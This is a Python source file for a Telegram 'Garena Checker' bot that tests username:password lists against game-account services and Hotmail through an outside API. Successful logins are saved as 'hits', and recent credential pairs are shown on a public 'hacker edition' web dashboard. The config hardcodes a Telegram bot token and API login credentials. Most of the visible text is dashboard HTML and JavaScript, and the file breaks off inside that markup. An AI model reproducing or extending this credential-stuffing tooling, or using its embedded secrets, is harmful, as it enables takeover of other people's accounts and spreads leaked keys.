# ========================================================================
#    GARENA CHECKER BOT V6.1 - HOAN CHINH
# ========================================================================
import subprocess, sys, importlib, threading, time, json, os, re, struct, math
import telebot, requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import HTTPServer, BaseHTTPRequestHandler

def install_package(pkg):
    try: importlib.import_module(pkg)
    except ImportError:
        try: subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--no-cache-dir"])
        except: pass

for pkg in ["requests", "pyTelegramBotAPI"]: install_package(pkg)

# ========== CONFIG ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
REQUIRED_CHANNEL = "@hakiiosvip"
REQUIRED_CHANNEL_ID = "@hakiiosvip"
REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"
API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"
DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 60
DEFAULT_RETRIES = 3
DEFAULT_DELAY = 0.3
CHECKMULTI_THREADS = 30
CHECKMULTI_DELAY = 0.5
CHECKMULTI_BATCH_SIZE = 10
CHECKMULTI_BATCH_DELAY = 3.0
OUTPUT_LOC = "loc_accounts.txt"
STATS_FILE = "check_stats.json"
MAX_MESSAGE_LENGTH = 4000

SERVICE_ROUTES = {
    "lienquan": {"route": "/api/lienquan", "desc": "Lien Quan Mobile", "icon": "🎮", "params": ["tk", "mk"], "extra_params": {}},
    "miniworld": {"route": "/api/miniworld", "desc": "Mini World", "icon": "🌍", "params": ["tk", "mk"], "extra_params": {}},
    "blockmango": {"route": "/api/blockmango", "desc": "Blockman Go", "icon": "🧱", "params": ["tk", "mk"], "extra_params": {}},
    "deltaforce": {"route": "/api/deltaforce", "desc": "Delta Force", "icon": "🔫", "params": ["tk", "mk"], "extra_params": {}},
    "hotmail": {"route": "/api/hotmail", "desc": "Hotmail", "icon": "📧", "params": ["tk", "mk"], "extra_params": {"keyword": ""}},
    "fc": {"route": "/api/fc", "desc": "FC Online", "icon": "⚽", "params": ["tk", "mk"], "extra_params": {}},
    "fullpack": {"route": "/api/fullpack", "desc": "Fullpack (Tat ca)", "icon": "📦", "params": ["tk", "mk"], "extra_params": {}}
}

checking = False
stop_event = threading.Event()
pending_accounts = {}
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "start_time": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
cache_results = {}
cache_lock = threading.Lock()
rate_lock = threading.Lock()
last_request_time = 0
start_time = time.time()

SESSION_STATS = {"total_checked": 0, "total_hits": 0, "total_dead": 0, "total_errors": 0, "session_start": time.time(), "accounts_checked": [], "hits_detail": [], "recent_checks": []}
SESSION_LOCK = threading.Lock()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

# ========== WEB SERVER ==========
class RenderHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(self.generate_dashboard().encode('utf-8'))
        elif self.path == '/ping':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"pong")
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            stats_data = load_stats()
            with SESSION_LOCK:
                session_data = {"session": SESSION_STATS, "uptime": time.time() - start_time, "is_checking": checking, "services": list(SERVICE_ROUTES.keys())}
            self.wfile.write(json.dumps({"status": "alive", "checking": checking, "stats": stats, "services": list(SERVICE_ROUTES.keys()), "admin": "baohuyno1", "version": "6.1", "total_stats": stats_data, "session_stats": session_data}, ensure_ascii=False).encode('utf-8'))
        elif self.path == '/api/stats/detailed':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            with SESSION_LOCK:
                session_data = {"session": SESSION_STATS, "uptime": time.time() - start_time, "current_time": datetime.now().isoformat(), "is_checking": checking, "services": list(SERVICE_ROUTES.keys())}
            session_data["recent_accounts"] = SESSION_STATS["recent_checks"][-50:]
            self.wfile.write(json.dumps(session_data, ensure_ascii=False).encode('utf-8'))
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
    
    def generate_dashboard(self):
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uptime = time.time() - start_time if 'start_time' in globals() else 0
        uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
        with SESSION_LOCK:
            session_checked = SESSION_STATS.get("total_checked", 0)
            session_hits = SESSION_STATS.get("total_hits", 0)
            session_dead = SESSION_STATS.get("total_dead", 0)
            session_errors = SESSION_STATS.get("total_errors", 0)
        total_stats = load_stats()
        total_checked = total_stats.get("total_checked", 0)
        total_hits = total_stats.get("total_hits", 0)
        total_dead = total_stats.get("total_dead", 0)
        total_errors = total_stats.get("total_errors", 0)
        bot_status = "Dang check" if checking else "San sang"
        bot_color = "#ff9800" if checking else "#4caf50"
        services_html = ""
        for key, value in SERVICE_ROUTES.items():
            services_html += f'<div class="service-card" data-service="{key}" onclick="showServiceDetail(\'{key}\')"><div class="service-icon">{value["icon"]}</div><div class="service-info"><div class="service-name">{key}</div><div class="service-desc">{value["desc"]}</div></div><div class="service-arrow">›</div></div>'
        
        html = f"""<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GARENA CHECKER - HACKER EDITION V6.1</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@400;600;700&display=swap');
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: 'Inter', 'Orbitron', 'Courier New', sans-serif; background: #0a0a0a; min-height: 100vh; color: #00ff00; overflow: hidden; user-select: none; }}
#bg-canvas {{ position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity:0.25; }}
#matrix-canvas {{ position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity:0.12; }}
#laser-canvas {{ position:fixed; top:0; left:0; width:100%; height:100%; z-index:1; pointer-events:none; }}
.container {{ position:relative; z-index:2; max-width:1100px; margin:15px auto; padding:20px; perspective:1200px; max-height:98vh; overflow-y:auto; }}
.container::-webkit-scrollbar {{ width:4px; }}
.container::-webkit-scrollbar-track {{ background:rgba(0,255,0,0.05); }}
.container::-webkit-scrollbar-thumb {{ background:#00ff00; border-radius:10px; }}
.header {{ text-align:center; padding:30px 25px; background:rgba(0,0,0,0.85); border-radius:20px; border:2px solid #00ff00; box-shadow:0 0 50px rgba(0,255,0,0.15), inset 0 0 50px rgba(0,255,0,0.03); position:relative; overflow:hidden; transform:rotateX(1deg) rotateY(1deg); transition:all 0.5s ease; animation:float3d 6s ease-in-out infinite; }}
.header:hover {{ transform:rotateX(0deg) rotateY(0deg) scale(1.01); box-shadow:0 0 80px rgba(0,255,0,0.3), inset 0 0 80px rgba(0,255,0,0.05); }}
@keyframes float3d {{ 0%,100%{{transform:rotateX(1deg) rotateY(1deg);}} 50%{{transform:rotateX(-1deg) rotateY(-1deg);}} }}
.header::before {{ content:''; position:absolute; top:-50%; left:-50%; width:200%; height:200%; background:conic-gradient(from 0deg,transparent,rgba(0,255,0,0.04),transparent,rgba(0,255,255,0.04),transparent,rgba(255,0,255,0.04),transparent); animation:rotate 15s linear infinite; }}
@keyframes rotate {{ from{{transform:rotate(0deg);}} to{{transform:rotate(360deg);}} }}
.header::after {{ content:''; position:absolute; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,0,0.02) 2px,rgba(0,255,0,0.02) 4px); pointer-events:none; }}
.title {{ font-size:2.8em; font-weight:900; font-family:'Orbitron',sans-serif; color:#00ff00; text-shadow:0 0 20px rgba(0,255,0,0.8), 0 0 40px rgba(0,255,0,0.5), 0 0 80px rgba(0,255,0,0.3), 3px 3px 0 #ff00ff, -3px -3px 0 #00ffff; animation:glitch3d 3s infinite, textPulse 2s infinite; position:relative; z-index:2; transform:translateZ(50px); letter-spacing:2px; }}
@keyframes glitch3d {{ 0%,100%{{transform:translateZ(50px) skew(0deg);text-shadow:0 0 20px rgba(0,255,0,0.8),3px 3px 0 #ff00ff,-3px -3px 0 #00ffff;}} 20%{{transform:translateZ(50px) skew(1.5deg);text-shadow:-3px 0 20px #ff0000,3px 0 20px #00ffff,0 0 40px #00ff00;}} 40%{{transform:translateZ(50px) skew(-1.5deg);text-shadow:3px 0 20px #ff00ff,-3px 0 20px #ffff00,0 0 40px #00ff00;}} 60%{{transform:translateZ(50px) skew(1deg);text-shadow:0 0 30px #00ff00,5px 5px 0 #ff00ff,-5px -5px 0 #00ffff;}} 80%{{transform:translateZ(50px) skew(-1deg);text-shadow:0 0 30px #00ff00,-5px 5px 0 #ff00ff,5px -5px 0 #00ffff;}} }}
@keyframes textPulse {{ 0%,100%{{opacity:1;}} 50%{{opacity:0.9;}} }}
.subtitle {{ font-size:1em; color:#88ff88; text-shadow:0 0 20px rgba(0,255,0,0.2); animation:flicker 2s infinite; position:relative; z-index:2; font-weight:400; letter-spacing:3px; }}
@keyframes flicker {{ 0%,100%{{opacity:1;}}5%{{opacity:0.5;}}10%{{opacity:1;}}95%{{opacity:1;}}96%{{opacity:0.3;}}97%{{opacity:1;}} }}
.social-buttons {{ display:flex; justify-content:center; gap:15px; margin-top:15px; position:relative; z-index:2; transform:translateZ(30px); flex-wrap:wrap; }}
.social-btn {{ display:inline-flex; align-items:center; gap:8px; padding:10px 22px; border-radius:50px; font-weight:700; font-size:0.85em; color:white; text-decoration:none; transition:all 0.4s cubic-bezier(0.175,0.885,0.32,1.275); position:relative; overflow:hidden; border:none; cursor:pointer; transform:rotateX(3deg) rotateY(3deg); font-family:'Inter',sans-serif; }}
.social-btn:hover {{ transform:rotateX(0deg) rotateY(0deg) scale(1.08) translateZ(20px); box-shadow:0 20px 60px rgba(0,255,0,0.25); }}
.social-btn.tiktok {{ background:linear-gradient(135deg,#00f2ea,#ff0050); box-shadow:0 0 30px rgba(255,0,80,0.25); }}
.social-btn.telegram {{ background:linear-gradient(135deg,#0088cc,#004488); box-shadow:0 0 30px rgba(0,136,204,0.25); }}
.status-badge {{ display:inline-block; padding:10px 25px; border-radius:50px; font-weight:700; font-size:1em; margin-top:12px; background: {bot_color}; color:white; box-shadow:0 0 30px rgba(0,255,0,0.4); animation:pulse3d 2s infinite; position:relative; z-index:2; transform:translateZ(40px); font-family:'Inter',sans-serif; }}
@keyframes pulse3d {{ 0%,100%{{transform:translateZ(40px) scale(1);box-shadow:0 0 30px rgba(0,255,0,0.4);}} 50%{{transform:translateZ(55px) scale(1.03);box-shadow:0 0 50px rgba(0,255,0,0.7);}} }}
.audio-indicator {{ display:inline-block; padding:6px 16px; border-radius:50px; font-size:0.8em; margin-top:8px; background:rgba(0,255,0,0.1); border:1px solid #00ff00; color:#00ff00; position:relative; z-index:2; animation:audioPulse 1.5s infinite; font-family:'Inter',sans-serif; }}
.audio-indicator .dot {{ display:inline-block; width:8px; height:8px; background:#00ff00; border-radius:50%; margin-right:8px; animation:dotPulse 1s infinite; }}
@keyframes audioPulse {{ 0%,100%{{box-shadow:0 0 15px rgba(0,255,0,0.1);}} 50%{{box-shadow:0 0 30px rgba(0,255,0,0.3);}} }}
@keyframes dotPulse {{ 0%,100%{{transform:scale(1);opacity:1;}} 50%{{transform:scale(1.6);opacity:0.5;}} }}
.stats-grid {{ display:grid; grid-template-columns:repeat(6, 1fr); gap:12px; margin:20px 0; transform:translateZ(20px); }}
.stat-card {{ background:linear-gradient(145deg,rgba(0,255,0,0.04),rgba(0,0,0,0.8)); border-radius:12px; padding:15px 12px; text-align:center; border:1px solid rgba(0,255,0,0.15); box-shadow:0 8px 25px rgba(0,0,0,0.4); transition:all 0.5s cubic-bezier(0.175,0.885,0.32,1.275); cursor:pointer; transform:rotateX(3deg); position:relative; overflow:hidden; }}
.stat-card:hover {{ transform:rotateX(0deg) scale(1.04) translateZ(25px); border-color:#00ff00; box-shadow:0 15px 40px rgba(0,255,0,0.2); }}
.stat-card::before {{ content:''; position:absolute; top:0; left:0; width:100%; height:2px; background:linear-gradient(90deg,transparent,#00ff00,transparent); animation:shimmer 2s infinite; }}
@keyframes shimmer {{ 0%{{transform:translateX(-100%);}} 100%{{transform:translateX(100%);}} }}
.stat-value {{ font-size:1.8em; font-weight:900; margin-bottom:3px; text-shadow:0 0 30px currentColor; font-family:'Orbitron',sans-serif; }}
.stat-label {{ font-size:0.6em; color:#88aa88; text-transform:uppercase; letter-spacing:1px; font-weight:600; }}
.stat-hits .stat-value {{ color:#00ff00; }}
.stat-dead .stat-value {{ color:#ff4444; }}
.stat-error .stat-value {{ color:#ff6b35; }}
.stat-checked .stat-value {{ color:#00ccff; }}
.stat-total .stat-value {{ color:#ff00ff; }}
.stat-totalchecked .stat-value {{ color:#ffaa00; }}
.stat-time .stat-value {{ color:#ff00ff; font-size:1em; }}
.detail-stats {{ background:rgba(0,0,0,0.7); border-radius:12px; padding:15px 20px; margin:15px 0; border:1px solid rgba(0,255,0,0.1); display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:10px; }}
.detail-row {{ display:flex; justify-content:space-between; padding:5px 0; border-bottom:1px solid rgba(0,255,0,0.05); font-size:0.9em; }}
.detail-row span:first-child {{ color:#88aa88; }}
.detail-value {{ font-weight:700; }}
.hits-color {{ color:#00ff00; }}
.dead-color {{ color:#ff4444; }}
.error-color {{ color:#ff6b35; }}
.total-color {{ color:#ffaa00; }}
.section-title {{ font-size:1.6em; text-align:center; margin:25px 0 15px; text-shadow:0 0 30px rgba(0,255,0,0.2); animation:flicker 2s infinite; transform:translateZ(30px); font-family:'Orbitron',sans-serif; letter-spacing:2px; }}
.services-grid {{ display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:12px; margin-bottom:20px; transform:translateZ(10px); }}
.service-card {{ background:linear-gradient(145deg,rgba(0,255,0,0.04),rgba(0,0,0,0.7)); border-radius:12px; padding:14px 16px; display:flex; align-items:center; gap:12px; border:1px solid rgba(0,255,0,0.08); transition:all 0.4s cubic-bezier(0.175,0.885,0.32,1.275); cursor:pointer; position:relative; overflow:hidden; }}
.service-card:hover {{ transform:translateZ(25px) scale(1.04); border-color:#00ff00; box-shadow:0 12px 35px rgba(0,255,0,0.15); background:linear-gradient(145deg,rgba(0,255,0,0.08),rgba(0,0,0,0.8)); }}
.service-card::after {{ content:''; position:absolute; top:-50%; left:-50%; width:200%; height:200%; background:conic-gradient(from 0deg,transparent,rgba(0,255,0,0.04),transparent,rgba(0,255,255,0.04),transparent); animation:rotate 10s linear infinite; opacity:0; transition:opacity 0.3s; }}
.service-card:hover::after {{ opacity:1; }}
.service-icon {{ font-size:1.8em; position:relative; z-index:2; flex-shrink:0; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(0,255,0,0.06); border-radius:12px; border:1px solid rgba(0,255,0,0.08); }}
.service-info {{ flex:1; position:relative; z-index:2; }}
.service-name {{ font-size:0.95em; font-weight:700; color:#fff; margin-bottom:2px; font-family:'Inter',sans-serif; }}
.service-desc {{ font-size:0.65em; color:#88aa88; font-weight:400; }}
.service-arrow {{ font-size:1.2em; color:#446644; transition:all 0.3s; position:relative; z-index:2; }}
.service-card:hover .service-arrow {{ color:#00ff00; transform:translateX(5px); }}
.recent-checks {{ background:rgba(0,0,0,0.5); border-radius:12px; padding:15px; margin:15px 0; border:1px solid rgba(0,255,0,0.08); max-height:200px; overflow-y:auto; }}
.recent-checks::-webkit-scrollbar {{ width:3px; }}
.recent-checks::-webkit-scrollbar-track {{ background:rgba(0,255,0,0.05); }}
.recent-checks::-webkit-scrollbar-thumb {{ background:#00ff00; border-radius:10px; }}
.recent-item {{ display:flex; justify-content:space-between; padding:3px 8px; font-size:0.75em; border-bottom:1px solid rgba(0,255,0,0.03); font-family:'Courier New',monospace; }}
.recent-item .status-hit {{ color:#00ff00; }}
.recent-item .status-dead {{ color:#ff4444; }}
.recent-item .status-error {{ color:#ff6b35; }}
.recent-item .time {{ color:#446644; font-size:0.8em; }}
.footer {{ text-align:center; padding:15px; color:#446644; font-size:0.7em; border-top:1px solid rgba(0,255,0,0.06); margin-top:15px; transform:translateZ(10px); font-weight:400; letter-spacing:1px; }}
.footer a {{ color:#00ff00; text-decoration:none; transition:all 0.3s; }}
.footer a:hover {{ color:#ff00ff; text-shadow:0 0 20px #ff00ff; }}
@media (max-width:768px) {{ .title {{ font-size:1.8em; }} .stats-grid {{ grid-template-columns:repeat(3,1fr); gap:8px; }} .services-grid {{ grid-template-columns:1fr; }} .social-buttons {{ flex-direction:column; align-items:center; }} .header {{ padding:20px; }} .container {{ padding:10px; margin:10px; max-height:95vh; }} .stat-value {{ font-size:1.4em; }} .detail-stats {{ grid-template-columns:1fr; }} }}
@media (max-width:480px) {{ .title {{ font-size:1.4em; letter-spacing:1px; }} .stats-grid {{ grid-template-columns:1fr 1fr; gap:6px; }} .stat-value {{ font-size:1.2em; }} .stat-card {{ padding:10px 8px; }} .service-card {{ padding:10px 12px; }} }}
</style>
</head>
<body>
<canvas id="bg-canvas"></canvas>
<canvas id="matrix-canvas"></canvas>
<canvas id="laser-canvas"></canvas>
<div class="container">
    <div class="header">
        <div class="title">🎮 GARENA CHECKER</div>
        <div class="subtitle">Version 6.1 - HACKER EDITION</div>
        <div class="subtitle">Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;text-decoration:none;">@baohuyno1</a></div>
        <div class="social-buttons">
            <a href="https://tiktok.com/@baohuy1109" target="_blank" class="social-btn tiktok">🎵 TikTok @baohuy1109</a>
            <a href="https://t.me/baohuyno1" target="_blank" class="social-btn telegram">✈️ Telegram</a>
        </div>
        <div class="status-badge" id="status-badge" style="background: {bot_color};">🟢 {bot_status}</div>
        <div class="audio-indicator"><span class="dot"></span> 🔊 AM THANH DANG PHAT</div>
        <div class="subtitle" style="font-size:0.7em;color:#446644;margin-top:5px;">⏱ Uptime: {uptime_str}</div>
    </div>
    <div class="stats-grid">
        <div class="stat-card stat-hits"><div class="stat-value">{session_hits}</div><div class="stat-label">🎯 Hits (Session)</div></div>
        <div class="stat-card stat-dead"><div class="stat-value">{session_dead}</div><div class="stat-label">❌ Dead (Session)</div></div>
        <div class="stat-card stat-error"><div class="stat-value">{session_errors}</div><div class="stat-label">⚠️ Errors (Session)</div></div>
        <div class="stat-card stat-checked"><div class="stat-value">{session_checked}</div><div class="stat-label">🔄 Checked (Session)</div></div>
        <div class="stat-card stat-total"><div class="stat-value">{total_hits}</div><div class="stat-label">🏆 Tong Hits</div></div>
        <div class="stat-card stat-totalchecked"><div class="stat-value">{total_checked}</div><div class="stat-label">📊 Tong Check</div></div>
    </div>
    <div class="detail-stats">
        <div class="detail-row"><span>✅ Hits (Session):</span><span class="detail-value hits-color">{session_hits}</span></div>
        <div class="detail-row"><span>❌ Dead (Session):</span><span class="detail-value dead-color">{session_dead}</span></div>
        <div class="detail-row"><span>⚠️ Errors (Session):</span><span class="detail-value error-color">{session_errors}</span></div>
        <div class="detail-row"><span>📊 Tong da check (Session):</span><span class="detail-value total-color">{session_checked}</span></div>
        <div class="detail-row"><span>🏆 Tong Hits (All):</span><span class="detail-value hits-color">{total_hits}</span></div>
        <div class="detail-row"><span>📊 Tong Check (All):</span><span class="detail-value total-color">{total_checked}</span></div>
        <div class="detail-row"><span>⏱ Thoi gian chay:</span><span class="detail-value" style="color:#00ccff;">{uptime_str}</span></div>
        <div class="detail-row"><span>📅 Thoi gian hien tai:</span><span class="detail-value" style="color:#ff00ff;">{current_time}</span></div>
    </div>
    <div class="section-title">📋 DICH VU HO TRO</div>
    <div class="services-grid">{services_html}</div>
    <div class="section-title">📜 RECENT CHECKS</div>
    <div class="recent-checks" id="recent-checks"><div style="text-align:center;color:#446644;padding:10px;">Loading...</div></div>
    <div class="footer">
        <p>© 2024 <a href="https://t.me/baohuyno1">@baohuyno1</a> - All rights reserved</p>
        <p style="color:#334433;font-size:0.65em;">⚡ HACKER EDITION - 3D EFFECTS - AUTO AUDIO - FULL INFO</p>
    </div>
</div>
<audio id="bg-audio" loop autoplay>
    <source src="/audio" type="audio/wav">
    <source src="/audio.mp3" type="audio/mpeg">
</audio>
<script>
const bgCanvas = document.getElementById('bg-canvas');
const bgCtx = bgCanvas.getContext('2d');
bgCanvas.width = window.innerWidth;
bgCanvas.height = window.innerHeight;
let particles = [];
const PARTICLE_COUNT = 120;
class Particle {{
    constructor() {{ this.reset(); }}
    reset() {{ this.x = Math.random() * bgCanvas.width; this.y = Math.random() * bgCanvas.height; this.z = Math.random() * 300 + 50; this.size = Math.random() * 3 + 1; this.speed = Math.random() * 0.5 + 0.1; this.color = `hsl(${{120 + Math.random() * 60}}, 100%, ${{40 + Math.random() * 30}}%)`; this.opacity = Math.random() * 0.8 + 0.2; }}
    update() {{ this.z -= this.speed; if (this.z < 10) this.reset(); const scale = 300 / this.z; this.sx = this.x * scale + bgCanvas.width/2 - this.x; this.sy = this.y * scale + bgCanvas.height/2 - this.y; this.ssize = this.size * scale; }}
    draw(ctx) {{ ctx.fillStyle = this.color; ctx.globalAlpha = this.opacity * (300 / this.z); ctx.beginPath(); ctx.arc(this.sx, this.sy, this.ssize, 0, Math.PI * 2); ctx.fill(); ctx.globalAlpha = 1; }}
}}
for (let i = 0; i < PARTICLE_COUNT; i++) {{ particles.push(new Particle()); }}
function drawBg() {{ bgCtx.fillStyle = 'rgba(10,10,10,0.3)'; bgCtx.fillRect(0,0,bgCanvas.width,bgCanvas.height); for (const p of particles) {{ p.update(); p.draw(bgCtx); }} requestAnimationFrame(drawBg); }}
drawBg();
const matrixCanvas = document.getElementById('matrix-canvas');
const matrixCtx = matrixCanvas.getContext('2d');
matrixCanvas.width = window.innerWidth;
matrixCanvas.height = window.innerHeight;
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+{{}}[]|;:,.<>?~';
const fontSize = 13;
const columns = Math.ceil(matrixCanvas.width / fontSize);
const drops = [];
for (let i = 0; i < columns; i++) {{ drops[i] = Math.random() * -100; }}
function drawMatrix() {{ matrixCtx.fillStyle = 'rgba(0,0,0,0.05)'; matrixCtx.fillRect(0,0,matrixCanvas.width,matrixCanvas.height); for (let i = 0; i < drops.length; i++) {{ const text = chars[Math.floor(Math.random() * chars.length)]; const bright = Math.random() > 0.92 ? '#ffffff' : '#00ff00'; matrixCtx.fillStyle = bright; matrixCtx.font = fontSize + 'px monospace'; matrixCtx.fillText(text, i * fontSize, drops[i] * fontSize); if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {{ drops[i] = 0; }} drops[i]++; }} }}
setInterval(drawMatrix, 50);
const laserCanvas = document.getElementById('laser-canvas');
const laserCtx = laserCanvas.getContext('2d');
laserCanvas.width = window.innerWidth;
laserCanvas.height = window.innerHeight;
const laserColors = ['#00ff00','#00ffff','#ff00ff','#ffff00','#ff4444','#44ff44','#ff8800'];
let lasers = [];
class LaserBeam {{
    constructor(x,y) {{ this.x = x || Math.random() * laserCanvas.width; this.y = y || Math.random() * laserCanvas.height; this.tx = Math.random() * laserCanvas.width; this.ty = Math.random() * laserCanvas.height; this.color = laserColors[Math.floor(Math.random() * laserColors.length)]; this.width = Math.random() * 2 + 0.5; this.life = 0; this.maxLife = Math.random() * 60 + 30; this.particles = []; }}
    update() {{ this.life++; if (Math.random() > 0.4) {{ this.particles.push({{x: this.x + (this.tx - this.x) * Math.random(), y: this.y + (this.ty - this.y) * Math.random(), vx: (Math.random() - 0.5) * 2, vy: (Math.random() - 0.5) * 2, life: 0, maxLife: Math.random() * 20 + 10}}); }} for (let i = this.particles.length - 1; i >= 0; i--) {{ const p = this.particles[i]; p.x += p.vx; p.y += p.vy; p.life++; if (p.life > p.maxLife) this.particles.splice(i, 1); }} if (this.life > this.maxLife) {{ const idx = lasers.indexOf(this); if (idx > -1) lasers.splice(idx, 1); }} }}
    draw(ctx) {{ const progress = this.life / this.maxLife; const alpha = progress < 0.1 ? progress * 10 : progress > 0.9 ? (1 - progress) * 10 : 1; const grad = ctx.createLinearGradient(this.x, this.y, this.tx, this.ty); grad.addColorStop(0, this.color + '00'); grad.addColorStop(0.5, this.color + 'FF'); grad.addColorStop(1, this.color + '00'); ctx.strokeStyle = grad; ctx.lineWidth = this.width; ctx.globalAlpha = alpha; ctx.shadowColor = this.color; ctx.shadowBlur = 12; ctx.beginPath(); ctx.moveTo(this.x, this.y); ctx.lineTo(this.tx, this.ty); ctx.stroke(); ctx.shadowBlur = 0; for (const p of this.particles) {{ const pa = 1 - (p.life / p.maxLife); ctx.fillStyle = this.color; ctx.globalAlpha = pa * alpha; ctx.shadowColor = this.color; ctx.shadowBlur = 6; ctx.beginPath(); ctx.arc(p.x, p.y, Math.random() * 2 + 1, 0, Math.PI * 2); ctx.fill(); ctx.shadowBlur = 0; }} ctx.globalAlpha = 1; }}
}}
function createLaser(x,y) {{ if (lasers.length < 80) lasers.push(new LaserBeam(x,y)); }}
function drawLasers() {{ laserCtx.clearRect(0,0,laserCanvas.width,laserCanvas.height); for (const l of lasers) {{ l.update(); l.draw(laserCtx); }} if (Math.random() > 0.97) {{ const fx = Math.random() * laserCanvas.width; const fy = Math.random() * laserCanvas.height; const fr = Math.random() * 35 + 15; const fc = laserColors[Math.floor(Math.random() * laserColors.length)]; const g = laserCtx.createRadialGradient(fx, fy, 0, fx, fy, fr); g.addColorStop(0, fc + 'FF'); g.addColorStop(1, fc + '00'); laserCtx.fillStyle = g; laserCtx.beginPath(); laserCtx.arc(fx, fy, fr, 0, Math.PI * 2); laserCtx.fill(); }} requestAnimationFrame(drawLasers); }}
for (let i = 0; i < 15; i++) createLaser();
drawLasers();
document.addEventListener('mousemove', function(e) {{ if (Math.random() > 0.88) {{ createLaser(e.clientX, e.clientY); if (lasers.length > 80) lasers.shift(); }} }});
document.addEventListener('click', function(e) {{ for (let i = 0; i < 6; i++) {{ createLaser(e.clientX, e.clientY); }} if (lasers.length > 80) lasers.splice(0, 6); }});
const audio = document.getElementById('bg-audio');
function playAudioDirect() {{
    audio.volume = 0.3;
    audio.loop = true;
    audio.setAttribute('autoplay', '');
    audio.muted = false;
    var playPromise = audio.play();
    if (playPromise !== undefined) {{
        playPromise.then(function() {{ console.log('🎵 Audio playing successfully'); }}).catch(function(error) {{
            console.log('Auto-play blocked, waiting for user interaction');
            document.addEventListener('click', function playOnce() {{
                audio.play().then(function() {{ console.log('🎵 Audio started after user click'); }}).catch(function(e) {{ console.log('Still blocked: ' + e); }});
                document.removeEventListener('click', playOnce);
            }}, {{ once: true }});
            setTimeout(function() {{ audio.play().catch(function() {{}}); }}, 1000);
        }});
    }}
}}
audio.addEventListener('canplaythrough', function() {{ if (audio.paused) {{ audio.play().catch(function() {{}}); }} }});
audio.addEventListener('error', function() {{ console.log('Audio error, reloading...'); audio.load(); setTimeout(function() {{ audio.play().catch(function() {{}}); }}, 500); }});
setTimeout(playAudioDirect, 300);
setInterval(function() {{ if (audio.paused && !audio.ended && audio.readyState >= 2) {{ audio.play().catch(function() {{}}); }} if (audio.error) {{ console.log('Audio error detected, reloading...'); audio.load(); setTimeout(function() {{ audio.play().catch(function() {{}}); }}, 500); }} }}, 3000);
function updateStats() {{
    fetch('/stats').then(r=>r.json()).then(d=>{{
        document.querySelector('.stat-hits .stat-value').textContent = d.session_stats?.session?.total_hits || 0;
        document.querySelector('.stat-dead .stat-value').textContent = d.session_stats?.session?.total_dead || 0;
        document.querySelector('.stat-error .stat-value').textContent = d.session_stats?.session?.total_errors || 0;
        document.querySelector('.stat-checked .stat-value').textContent = d.session_stats?.session?.total_checked || 0;
        document.querySelector('.stat-total .stat-value').textContent = d.total_stats?.total_hits || 0;
        document.querySelector('.stat-totalchecked .stat-value').textContent = d.total_stats?.total_checked || 0;
        const details = document.querySelectorAll('.detail-stats .detail-value');
        if (details.length >= 8) {{
            details[0].textContent = d.session_stats?.session?.total_hits || 0;
            details[1].textContent = d.session_stats?.session?.total_dead || 0;
            details[2].textContent = d.session_stats?.session?.total_errors || 0;
            details[3].textContent = d.session_stats?.session?.total_checked || 0;
            details[4].textContent = d.total_stats?.total_hits || 0;
            details[5].textContent = d.total_stats?.total_checked || 0;
        }}
        const badge = document.getElementById('status-badge');
        badge.textContent = d.checking ? '🔴 Dang check' : '🟢 San sang';
        badge.style.background = d.checking ? '#ff9800' : '#4caf50';
    }}).catch(e=>console.log(e));
    fetch('/api/stats/detailed').then(r=>r.json()).then(d=>{{
        const container = document.getElementById('recent-checks');
        const recent = d.recent_accounts || [];
        if (recent.length === 0) {{ container.innerHTML = '<div style="text-align:center;color:#446644;padding:10px;">Chua co acc nao duoc check</div>'; }}
        else {{
            let html = '';
            for (const item of recent.slice(-20).reverse()) {{
                const statusClass = item.status === 'hit' ? 'status-hit' : item.status === 'dead' ? 'status-dead' : 'status-error';
                const statusIcon = item.status === 'hit' ? '✅' : item.status === 'dead' ? '❌' : '⚠️';
                const time = item.time || new Date().toLocaleTimeString('vi-VN');
                html += `<div class="recent-item"><span><span class="${{statusClass}}">${{statusIcon}} ${{item.user}}:${{item.pwd}}</span></span><span class="time">${{time}}</span></div>`;
            }}
            container.innerHTML = html;
        }}
    }}).catch(e=>console.log(e));
}}
setInterval(updateStats, 3000);
updateStats();
console.log('🔥 GARENA CHECKER HACKER EDITION V6.1 LOADED!');
console.log('📊 FULL INFO - STATS SAVED TO check_stats.json');
